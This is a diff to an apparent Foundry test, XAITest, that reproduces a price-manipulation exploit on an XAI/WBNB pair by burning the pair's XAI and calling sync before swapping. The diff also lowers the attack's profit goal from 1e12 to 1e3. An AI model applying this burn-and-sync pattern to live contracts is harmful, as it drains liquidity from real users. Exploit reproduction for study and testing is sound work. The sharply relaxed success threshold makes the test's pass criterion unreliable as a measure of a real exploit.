@@ -125,7 +125,7 @@ contract XAITest is Test, BlockLoader {
     }
 
     function attackGoal() public view returns (bool) {
-        return wbnb.balanceOf(attacker) >= 1e12 + balanceOfwbnbattacker;
+        return wbnb.balanceOf(attacker) >= 1e3 + balanceOfwbnbattacker;
     }
 
     function borrow_wbnb_owner(uint256 amount) internal eurus {
@@ -167,7 +167,7 @@ contract XAITest is Test, BlockLoader {
     }
 
     function burn_xai_pair(uint256 amount) internal eurus {
-        xai.burn(amount);
+        xai.burn(xai.totalSupply() - amount);
         pair.sync();
     }
 
@@ -552,7 +552,7 @@ contract XAITest is Test, BlockLoader {
             pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
         );
         printBalance("After step1 ");
-        burn_xai_pair(xai.totalSupply() - 10000);
+        burn_xai_pair(10000);
         printBalance("After step2 ");
         swap_pair_attacker_xai_wbnb(
             xai.balanceOf(attacker),
